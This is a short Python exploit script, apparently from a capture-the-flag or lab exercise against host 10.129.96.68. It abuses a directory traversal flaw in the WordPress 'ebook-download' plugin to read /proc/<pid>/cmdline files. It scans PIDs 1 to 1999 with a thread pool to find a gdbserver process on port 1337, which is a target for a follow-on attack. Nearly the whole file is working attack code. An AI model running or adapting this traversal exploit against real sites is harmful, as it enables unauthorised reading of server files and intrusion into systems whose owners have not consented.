#!/usr/bin/python3
import requests
from concurrent.futures import ThreadPoolExecutor
import sys

TARGET_URL_BASE = "http://10.129.96.68/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/"

def fetch_cmdline(pid):
    try:
        url = f"{TARGET_URL_BASE}{pid}/cmdline"
        r = requests.get(url, timeout=2)
        if r.status_code == 200 and r.text:
            # Replace null bytes typical in cmdline files for readability
            content = r.text.replace('\x00', ' ').strip()
            if "gdbserver" in content and "0.0.0.0:1337" in content:
                print(f"[+] Found GDB Server command for PID {pid}: {content}")
                return content # Return content to signal found
    except requests.exceptions.RequestException:
        pass
    except Exception as e:
        # print(f"Error processing PID {pid}: {e}") # Optional: for debugging
        pass
    return None

pids_to_check = range(1, 2000) # Check a reasonable range of PIDs
print(f"[*] Scanning PIDs 1-1999 for gdbserver command line...")
with ThreadPoolExecutor(max_workers=20) as executor:
    # Submit tasks
    future_to_pid = {executor.submit(fetch_cmdline, pid): pid for pid in pids_to_check}
    for future in future_to_pid:
        result = future.result()
        if result:
            print(f"[*] GDB Server found. Halting scan.")
            # Attempt to cancel remaining futures (best effort)
            for f_cancel in future_to_pid.keys():
                if not f_cancel.done():
                    f_cancel.cancel()
            executor.shutdown(wait=False) # Python 3.9+ use cancel_futures=True
            break
print("[*] Scan complete.")
EOF
